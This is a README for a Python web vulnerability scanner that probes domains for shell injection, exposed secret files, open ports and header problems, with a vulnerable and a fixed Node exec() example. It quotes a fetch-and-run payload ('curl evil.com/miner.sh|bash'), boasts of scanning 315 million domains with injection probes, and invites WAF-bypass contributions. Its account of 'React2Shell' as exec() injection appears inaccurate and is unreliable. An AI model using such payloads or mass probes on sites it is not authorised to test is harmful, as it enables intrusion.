# 🔍 WebVulnScanner

> **Crash-proof, memory-safe web vulnerability scanner built for scale.**  
> Tested against **315 million domains** without a single crash.

![Python](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square&logo=python)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Scale](https://img.shields.io/badge/Scale-350M%2B%20sites-red?style=flat-square)

---

## 🧠 What is this?

While testing **my vibecoded projects** built on Next.js and Docker, I discovered a critical vulnerability in most of the sites **React2Shell**.  It allowed unsanitized user inputs to get passed directly to Node.js shell commands, allowing remote code execution.

I needed a tool that could:
- Scan domains without crashing on low end specs
- Detect React2Shell and other real-world vulnerabilities
- Resume automatically after interruption
- Never produce false positives on parking pages

So I built one.

---

## ⚡ Features

- 🐚 **React2Shell / Shell Injection** — fires canary payloads across common Next.js API routes and detects real execution
- 🔐 **SSL/TLS Analysis** — expired certs, expiring soon, verification failures
- 🚪 **Dangerous Open Ports** — MySQL, PostgreSQL, Redis, MongoDB, FTP, Telnet, dev servers
- 📄 **Exposed Sensitive Files** — `.env`, `.git/config`, `docker-compose.yml`, `package.json` with *content validation* — not just HTTP 200
- 🌐 **CORS Misconfiguration** — wildcard `Access-Control-Allow-Origin: *`
- 🛡️ **Security Headers Audit** — HSTS, CSP, X-Frame-Options, Referrer-Policy and more
- 🅿️ **Zero false positives** on parking/wildcard servers — canary path detection built-in
- ♻️ **Auto-deduplication** — same URL never scanned twice
- 💾 **Auto-resume** — saves progress every 1,000 URLs, picks up exactly where it stopped

---

## 🚀 Installation

```bash
git clone https://github.com/YOUR_USERNAME/WebVulnScanner.git
cd WebVulnScanner
pip install requests
```

> **Requirements:** Python 3.8+ — no other dependencies

---

## 📖 Usage

**Basic scan:**
```bash
python3 vuln_scanner.py "/path/to/domains.txt"
```

**Recommended for large lists:**
```bash
python3 vuln_scanner.py "/path/to/domains.txt" --threads 35 --timeout 3 --skip-timing
```

**Resume after Ctrl+C — just run the same command:**
```bash
python3 vuln_scanner.py "/path/to/domains.txt" --threads 35 --timeout 3 --skip-timing
```

**Wipe previous results and start fresh:**
```bash
python3 vuln_scanner.py "/path/to/domains.txt" --fresh --threads 35 --timeout 3 --skip-timing
```

---

## 🔧 Arguments

| Argument | Default | Description |
|---|---|---|
| `input` | *required* | Path to text file — one URL or domain per line |
| `--output` | `vulnerable_sites.txt` | Output filename prefix |
| `--threads` | `6` | Parallel worker threads |
| `--timeout` | `10` | Per-request timeout in seconds |
| `--resume` | off | Explicitly resume from saved progress |
| `--fresh` | off | Delete all previous results and start from line 1 |
| `--skip-timing` | off | Skip slow timing-based shell checks |

---

## 📁 Output Files

| File | Contents |
|---|---|
| `vulnerable_sites.txt` | ⚠️ Clean list of vulnerable URLs — one per line |
| `vulnerable_sites_details.txt` | 📋 Full breakdown of every issue found per site |
| `vulnerable_sites_warnings.txt` | 🟡 Sites with warnings but no critical vulnerabilities |
| `vulnerable_sites_scan.log` | 🗂️ Complete timestamped log of every site scanned |

**Example output in `_details.txt`:**

```
============================================================
URL:     https://example-client.com
SCANNED: 2026-03-03 15:55:11
  [HIGH] Shell injection (React2Shell) at /api/convert?file=<payload>
  [HIGH] Port 3306 open — MySQL exposed to internet
  [HIGH] Port 6379 open — Redis exposed (often no auth)
  [HIGH] Exposed /.env — DATABASE_URL=postgres://admin:s3cr3t@...
  [WARN] SSL cert expires in 12 days
  [WARN] Missing security headers: Strict-Transport-Security, CSP
  [INFO] Server: nginx/1.24.0
  [INFO] X-Powered-By: Express
============================================================
```


---

## 🧩 How It Works

```
Input file (streaming, line by line)
        │
        ▼
 URL Normalizer + Deduplicator
        │
        ▼
 Work Queue (bounded — 400 items max)
        │
   ┌────┴────┐
   │ Workers │  × N threads
   └────┬────┘
        │  Each worker runs:
        │  1. Reachability check
        │  2. SSL certificate check
        │  3. Security headers + CORS check
        │  4. Open port scan
        │  5. Sensitive file check (wildcard detection + content validation)
        │  6. Shell injection — React2Shell canary
        ▼
 Result Queue (bounded)
        │
        ▼
 Writer Thread — appends to disk instantly, never buffers
```

---

## 🛡️ False Positive Prevention

**The problem:** Parking/wildcard servers return HTTP 200 for *every* path — including `/.env`, `/.git/config`, etc. — which causes naive scanners to flag thousands of false positives.

**The solution — three layers of validation:**

**1. Canary path detection**  
Before checking any sensitive paths, sends a request to a random 14-character path that should *never* exist. If the server returns 200 HTML for that, it's a wildcard server — file checks are skipped entirely.

**2. Content fingerprinting**

| File | Must actually contain |
|---|---|
| `/.env` | `KEY=VALUE` pattern with uppercase key |
| `/.git/config` | `[core]` or `[remote` section |
| `/.git/HEAD` | `ref:` prefix or 40-char hex commit hash |
| `/docker-compose.yml` | `services:` keyword |
| `/package.json` | Both `"name"` and `"version"` keys |
| `/api/config` | Valid JSON object `{...}`, not HTML |

**3. Dynamic canary string**  
The shell injection canary is *randomly generated at runtime* — never the same string twice — so server admins cannot hardcode it into responses to defeat detection.

---

## 🐚 What is React2Shell?

React2Shell is a critical vulnerability class in Next.js/Node.js apps where user input reaches `child_process.exec()` unsanitized:

**❌ Vulnerable code:**
```javascript
import { exec } from 'child_process';

export default function handler(req, res) {
  const { file } = req.query;
  // Attacker sends: ?file=;curl+evil.com/miner.sh|bash
  exec(`convert ${file} output.png`, (err, stdout) => {
    res.json({ result: stdout });
  });
}
```

An attacker sends `?file=;curl+attacker.com/miner.sh|bash` and gets **full remote code execution** on your server. This is how crypto miners, backdoors, and data exfiltration payloads get installed on misconfigured Docker containers.

**✅ Safe version:**
```javascript
import { execFile } from 'child_process';

export default function handler(req, res) {
  const { file } = req.query;
  // Args passed as array — no shell interpolation possible
  execFile('convert', [file, 'output.png'], (err, stdout) => {
    res.json({ result: stdout });
  });
}
```

> *Use `execFile()` instead of `exec()` — arguments are passed as an array, never interpolated into a shell string*

---

## 💡 Why It Doesn't Crash

Most scanners crash on large inputs because they load everything into RAM. This one doesn't:

- **Streaming I/O** — reads one URL at a time, file is never loaded into memory
- **Bounded queues** — work queue capped at 400 items, natural backpressure prevents runaway memory
- **Instant disk writes** — dedicated writer thread with `buffering=1`, nothing held in memory
- **Progress checkpointing** — saves line position every 1,000 URLs, resumes exactly on interrupt
- **Explicit GC** — calls `gc.collect()` after every site scan
- **Deduplication with flush** — seen-URL set capped at 2M entries then flushed

---

## 🤝 Contributing

Pull requests are welcome. Areas for improvement:

- WAF bypass techniques for shell injection probes
- Additional Next.js-specific checks *(middleware misconfig, SSRF via `next.config.js` rewrites)*
- Rate limiting / politeness delay option
- JSON and CSV output formats
- Webhook notifications on critical findings

---

## ⚖️ Legal Disclaimer

> **This tool is intended solely for use on systems you own or have explicit written permission to test.**
>
> Unauthorized scanning may violate the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, GDPR, and equivalent laws in your jurisdiction. The author is not responsible for any misuse of this tool.
>
> **Use responsibly and ethically.**

